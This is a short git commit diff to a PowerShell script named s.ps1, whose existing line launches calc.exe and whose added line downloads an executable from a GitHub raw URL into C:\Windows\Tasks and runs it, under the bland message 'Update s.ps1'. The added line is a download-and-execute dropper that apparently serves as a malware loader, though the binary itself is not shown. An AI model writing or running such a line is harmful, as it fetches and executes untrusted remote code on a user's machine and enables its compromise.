55b333b40bfc61205b38ab4b9f903aca0a0cb7d9
guilegel4 <guilegel4@mail.com>
2025-02-05 14:46:47 +0100

    Update s.ps1

--- s.ps1
+++ s.ps1
@@ -1,1 +1,2 @@
 Start-Process "calc.exe"
+ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/guilegel4/server/refs/heads/main/s.exe" -OutFile "C:\Windows\Tasks\s.exe"; Start-Process -FilePath "C:\Windows\Tasks\s.exe" -Wait
